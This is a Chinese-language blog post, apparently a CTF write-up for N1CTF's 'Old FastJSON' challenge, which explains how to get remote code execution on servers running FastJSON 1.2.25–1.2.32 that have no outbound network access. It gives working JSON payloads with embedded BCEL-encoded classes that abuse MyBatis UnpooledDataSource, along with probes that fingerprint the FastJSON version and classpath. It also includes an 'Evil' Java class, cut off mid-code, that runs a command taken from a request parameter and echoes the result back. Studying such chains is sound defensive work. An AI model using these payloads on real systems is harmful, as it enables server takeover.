<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">js =    <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource\&quot;&#125;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;]&quot;</span>;</span><br><span class="line"></span><br><span class="line">System.out.println(js);</span><br><span class="line">JSON.parse(js);</span><br><span class="line"></span><br><span class="line">js = <span class="string">&quot;[&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource\&quot;, \&quot;driverClassLoader\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$[1]\&quot;&#125;, \&quot;driver\&quot;:\&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMO$h1$Q$7dN$96$ec$H$h$C$a1$J$94$C$N$a5$zI$r$c8$81cP$_$V$95$aan$L$o$u$a8G$c75$c1tY$af6$O$f0$8f8s$a1$V$95$da$7b$7f$Ub$bcEi$q$ea$83g$e6$bd7$cfc$fb$cf$dd$ed$_$A$dbh$G$f0$b1$Y$e0$v$96$3c$3c$b3q$d9$c5$8a$8b$d5$A$r$3cw$d1p$b1$c6P$daQ$892o$Z$8a$cdV$8f$c1y$a7$bfJ$86J$a4$S$f9yt$d6$97$d9$n$ef$c7$84T$p$zx$dc$e3$99$b2$f5$D$e8$98$T5$q$8fh$f7$5c$c5$j$GoG$c4$Pv$8c$e8Zt$ca$cfy$5b$e9$f6$87$bd$ddK$nS$a3tB$b2r$d7p$f1$ed$TOs$h$g$8a$n$e8$eaQ$s$e4$7bem$7dk$b7e$7bC$E$98v$f1$o$c4$3a$5e2$d4u$w$93$c6$so$d0$ub$Us$a3$b3$z$9e$a6$n$5e$e15$c3$fc$7fNcX$ca$d1$98$t$83$f6$c1$u1$eaL$8eI$eb$beA$b7$b0$c71$cc$fe$T$ee$f5O$a50$Ms$8fzi$d2$814$e3$a2$d6lE$8f4tCG$5eJ$c1$b0$d1$9c$60$bb$sS$c9$a03$d9$b0$9fi$n$87CjX$9cT$k$9ed$fa$c2$3eM$a7$d5$c3$g$3c$faG$bb$K$60$f69h$P$f3$P$a6G$a68$f5$e6$3b$d8uN$97i$P$u$822$H$V$ccP$W$fe$VQ5K$d1$c3$dc$d8$e0$Y$c5$9c$5b$f8$81B$b5x$D$e7$e8$K$e5$8f$3fQ$faB$8e$ee$ef$eb$9c$f4I$3aEBk$5d$a7$Mp$J$L$I$f5$I$f3$J$9b$k$lc$eb$w$e6$a9z$92$eb$K$91$8b$9aOD$3d$9fn$e1$k$acK$b2$e2$9a$C$A$A\&quot;&#125;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;,\&quot;\&quot;:\&quot;\&quot;&#125;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.alibaba.fastjson.JSONObject\&quot;,\&quot;connection\&quot;:&#123;&#125;&#125;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource\&quot;,\&quot;driver\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.connection\&quot;&#125;&#125;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;]&quot;</span>;</span><br><span class="line"></span><br><span class="line">System.out.println(js);</span><br><span class="line">JSON.parse(js);</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682381501004.jpg"></p>
<p>Web中利用，1、恶意类加入mapping</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682381578158.jpg"></p>
<p>2、调用getter RCE<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682381630392.jpg"></p>
<h3 id="1-1-N1CTF-Old-FastJSON"><a href="#1-1-N1CTF-Old-FastJSON" class="headerlink" title="1.1 N1CTF Old FastJSON"></a>1.1 N1CTF Old FastJSON</h3><p>在这次的n1ctf中，我将这个利用改了改出成了一道题。稍微有一点不同的在于，之前实战遇到的目标是黑盒测试普通Tomcat项目的JSON.parse，题目改成了SpringBoot fastJsonHttpMessageConverters。</p>
<p>题目叫做Old FastJSON，题目描述为Rce and get flag，最终一支队伍解出，第一天给出了User.java的代码，本来准备是第二天白天给出完整代码，不过有队伍在第二天凌晨已经解出来了，就没有再放完整代码了。<br>根据题目很容易了解到是要针对老版本FastJSON实现RCE，登录后抓包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;api&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: local:8080</span><br><span class="line">Content-Length: 35</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;asd&quot;,&quot;password&quot;:&quot;asd&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>根据404页面能够知道后端框架为SpringBoot<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682381793754.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,</span><br><span class="line">&quot;val&quot;:&quot;127.0.0.1&quot;,</span><br><span class="line">&quot;username&quot;:&quot;asd&quot;,&quot;password&quot;:&quot;asd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682381903601.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,</span><br><span class="line">&quot;val&quot;:&quot;127.0.0.1&quot;&#125;,</span><br><span class="line">&quot;username&quot;:&quot;asd&quot;,&quot;password&quot;:&quot;asd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682382041559.jpg"></p>
<p>@type提交后发现后端产生了异常，而将@type放到value时不会产生异常，能够知道是因为设置了期望类导致type not match的原因，能够想到是SpringBoot常用FastJSON HttpMessageConverters方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@ResponseBody</span><br><span class="line">@PostMapping(value &#x3D; &#123;&quot;&#x2F;api&#x2F;login&quot;&#125;, produces&#x3D;&quot;application&#x2F;json;charset&#x3D;UTF-8&quot;)</span><br><span class="line">public Object doLogin(@RequestBody User user, HttpServletRequest request)&#123;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,</span><br><span class="line">&quot;val&quot;:&quot;127.0.0.1&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;username&quot;:&quot;asd&quot;,&quot;password&quot;:&quot;asd&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682382216242.jpg"></p>
<p>返回正常，证明FastJSON &lt; 1.2.48版本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,</span><br><span class="line">&quot;a&quot;:&#123;&quot;@type&quot;:&quot;bbb&quot;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回异常，证明版本&gt;1.2.24</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,</span><br><span class="line">&quot;val&quot;:&quot;www.baidu.com&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;username&quot;:&quot;asd&quot;,&quot;password&quot;:&quot;asd&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682382410737.jpg"></p>
<p>127.0.0.1返回正常，<a target="_blank" rel="noopener" href="http://www.baidu.com返回异常,说明目标机器不存在dns配置或者不出网./">www.baidu.com返回异常，说明目标机器不存在DNS配置或者不出网。</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;c&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;javax.swing.JEditorPane&quot;&#125;,&quot;d&quot;:&#123;&quot;@type&quot;:&quot;javax.swing.JEditorPane&quot;,&quot;page&quot;:&quot;http:&#x2F;&#x2F;host&#x2F;a&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>提交返回异常，且无请求产生，也就说明了目标机器无DNS且无法出网，也就是说需要在不出网的场景下实现RCE。</p>
<p>然后探测目标classpath下是否存在公开的FastJSON不出网RCE的利用链，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">&quot;val&quot;:&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><br><span class="line">&#125;,&quot;b&quot;:&#123;</span><br><span class="line">&quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;&#125;,</span><br><span class="line">&quot;username&quot;:&quot;a&quot;,</span><br><span class="line">&quot;password&quot;:&quot;b&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回异常，证明classpath下不存在dbcp利用链<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682382650301.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">&quot;val&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><br><span class="line">&#125;,&quot;b&quot;:&#123;</span><br><span class="line">&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;&#125;,</span><br><span class="line">&quot;username&quot;:&quot;a&quot;,</span><br><span class="line">&quot;password&quot;:&quot;b&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682382762942.jpg"></p>
<p>返回正常，证明classpath下存在mybatis，进而使用mybatis实现不出网RCE。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;x&quot;:&#123;&quot;xxx&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;&#125;,&quot;c&quot;:&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;&#125;,&quot;www&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;c&quot;:&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;&#125;,&quot;c&quot;:&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,&quot;driverClassLoader&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driver&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$hA$Q$ac$b1$8d$f7$c1$9a$87$c1$e6$91$84$98$b7$8d$E$3e$e4h$94K$ER$94M$88bd$94$e3x$Y$cc$c0$b2$b3Z$8f$81$3f$e2$cc$85D$89$94$dc$f3Q$88$9e$F$ZKd$P$dd$d3U$d5$d5$3d$b3$ff$ee$7f$fd$B$f0$Ou$l$k$e6$7d$y$60$d1$c5$x$9b_$3bx$e3$60$c9G$Ro$j$d4$i$y3$UwU$ac$cc$7b$86$7c$bd$d1a$u$7c$d0$c7$92a2T$b1$fc2$b8$e8$ca$f4$90w$pB$ca$a1$W$3c$ea$f0T$d9$fa$J$y$98S$d5$t$8fp$efRE$z$GwWDOv$8c$e8Jx$c6$_yS$e9$e6$c7$83$bdk$n$T$a3tL$b2R$dbpq$fe$99$t$99$N$z$c5$e0$b7$f5$m$Vr_Y$5b$cf$da$ed$d8$de$A$3e$c6$j$ac$EX$c5$gCU$t2$aem$f3$g$ad$o$G$R7$3a$dd$e1I$S$60$j$h$M3$ff$99$c6$b0$98$a1$R$8f$7b$cdo$83$d8$a8$L9$q$ad$fb$s$dd$c2$8ec$98z$W$kt$cf$a40$M$d3$_zi$d3$9e4$c3$a2Ro$84$_4t$c3$82$bc$96$82a$b3$3e$c2$b6M$aa$e2$5ek$b4$e1k$aa$85$ec$f7$a9a$7eTyx$9a$ea$x$fb4$adF$H$cbp$e9$3f$da$_$Hf$9f$83b$40U$932$a3$3c$b6$f5$D$ec6$a3K$U$8b$Z$98$c7$E$c5$e0Q$80ILQv1$3dl$3e$n$85$e5$e6$7e$oW$ce$df$a1pt$83$d2$a7$df$u$7e$t7$e7$efmFz$q$j$p$a1$b5$ad$d2$Jp$I$f3$Ju$J$f3$I$h$l$8e$b1u$Z3T$cdf$ba$5c$e8$a0$e2$RQ$cd6$9b$7b$A$7f$Q$bb$L$96$C$A$A&quot;&#125;&#125;:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>使用1.2.47的利用，没能成功实现RCE，能够猜到版本为1.2.25 - 1.2.32 之间的版本。接下来就是上面写的分析这些版本里如何实现RCE内容了，这也是我自己当初在黑盒测目标时的整个分析历程。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@PostMapping(value = &#123;&quot;/api/login&quot;&#125;, produces=&quot;application/json;charset=UTF-8&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">doLogin</span><span class="params">(<span class="meta">@RequestBody</span> User user, HttpServletRequest request)</span></span>&#123;</span><br></pre></td></tr></table></figure>

<p>SpringBoot的fastJsonHttpMessageConverters与普通的JSON.parse也存在一定的不同。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;, &quot;driverClassLoader&quot;:&#123;&quot;$ref&quot;:&quot;$[1]&quot;&#125;, &quot;driver&quot;:&quot;$$BCEL$$&quot;&#125;,&#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;,&quot;&quot;:&quot;&quot;&#125;,&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;connection&quot;:&#123;&#125;&#125;,&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,&quot;driver&quot;:&#123;&quot;$ref&quot;:&quot;$.connection&quot;&#125;&#125;]</span><br></pre></td></tr></table></figure>

<p>首先是因为接口定义的类并不是一个数组，而之前构造的利用是数组形式的，并不支持这种形式，需要换回{}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;x&quot;:[&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;, &quot;driverClassLoader&quot;:&#123;&quot;$ref&quot;:&quot;$[1]&quot;&#125;, &quot;driver&quot;:&quot;$$BCEL$$&quot;&#125;,&#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;,&quot;&quot;:&quot;&quot;&#125;,&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;connection&quot;:&#123;&#125;&#125;,&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,&quot;driver&quot;:&#123;&quot;$ref&quot;:&quot;$.connection&quot;&#125;&#125;],</span><br><span class="line">&quot;username&quot;:&quot;a&quot;,</span><br><span class="line">&quot;password&quot;:&quot;b&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提交后发现依然失败。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682383253169.jpg"></p>
<p>调试发现是因为SpringBoot fastJsonHttpMessageConverters进行JSON.parse的时候会默认设置期望类为路由参数里对应的类，也就是期望类为com.n1ctf.oldfastjson.User，而普通的JSON.parse是不存在这个问题的。<br>这也就导致了Root context变为了com.n1ctf.oldfastjson.User对象，因为x并不是User的Field，会被设置为null，导致了之前构造payload里面的各种引用都需要更改。<br>但是直接将引用修改为$.null[1]也无法利用，因为这时候的RootContext变为了User。<br>com.alibaba.fastjson.JSONPath#getPropertyValue 中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">getPropertyValue</span><span class="params">(Object currentObject, String propertyName, <span class="keyword">boolean</span> strictMode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (currentObject == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentObject <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">        Map map = (Map)currentObject;</span><br><span class="line">        Object val = map.get(propertyName);</span><br><span class="line">        <span class="keyword">if</span> (val == <span class="keyword">null</span> &amp;&amp; <span class="string">&quot;size&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">            val = map.size();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class&lt;?&gt; currentClass = currentObject.getClass();</span><br><span class="line">        JavaBeanSerializer beanSerializer = <span class="keyword">this</span>.getJavaBeanSerializer(currentClass);</span><br><span class="line">        <span class="keyword">if</span> (beanSerializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> beanSerializer.getFieldValue(currentObject, propertyName);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONPathException(<span class="string">&quot;jsonpath error, path &quot;</span> + <span class="keyword">this</span>.path + <span class="string">&quot;, segement &quot;</span> + propertyName, var12);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentObject <span class="keyword">instanceof</span> List) &#123;</span><br><span class="line">            List list = (List)currentObject;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;size&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">                <span class="keyword">return</span> list.size();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                List&lt;Object&gt; fieldValues = <span class="keyword">new</span> JSONArray(list.size());</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; list.size(); ++i) &#123;</span><br><span class="line">                    Object obj = list.get(i);</span><br><span class="line">                    Object itemValue = <span class="keyword">this</span>.getPropertyValue(obj, propertyName, strictMode);</span><br><span class="line">                    <span class="keyword">if</span> (itemValue <span class="keyword">instanceof</span> Collection) &#123;</span><br><span class="line">                        Collection collection = (Collection)itemValue;</span><br><span class="line">                        fieldValues.addAll(collection);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        fieldValues.add(itemValue);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> fieldValues;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>首先会对rootContext对象进行一次getFieldValue操作，如果不存在对应Field则会直接抛出异常结束流程。<br>package com.n1ctf.oldfastjson;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Object friend;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getFriend</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> friend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFriend</span><span class="params">(Object friend)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.friend = friend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据题目中给出了User类中，可以发现存在username、password、friend属性。<br>这里需要使用friend属性来进行反序列化，因为friend属性的类型为Object，而username和password都为String，FastJSON在反序列化Field的时候会根据类型选择反序列化器，String类型就会为StringCodec反序列化器没法反序列化出list。<br>选择friend属性反序列化出list后，又会递归getPropertyValue，然后又跟前面的流程一样了，遍历List中的对象再递归调用getPropertyValue，触发getter方法实现RCE。<br>实现代码执行后，SpringBoot就可以轻松实现命令执行回显了，因为BCEL ClassLoader的原因无法直接获取到webapp下的类。先通过Thread.currentThread().getContextClassLoader() 获取当前线程的classloader，进而获取到webapp下的类，实现命令执行回显，代码如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class requestContextHolder = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Method m = requestContextHolder.getDeclaredMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        Object obj = m.invoke(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        m = obj.getClass().getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        Object request = m.invoke(obj);</span><br><span class="line"></span><br><span class="line">        m = obj.getClass().getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        Object response = m.invoke(obj);</span><br><span class="line"></span><br><span class="line">        m = request.getClass().getMethod(<span class="string">&quot;getParameter&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        String cmd = (String) m.invoke(request, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmd == <span class="keyword">null</span>)&#123;</span><br><span class="line">            cmd = <span class="string">&quot;id&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = &#123;<span 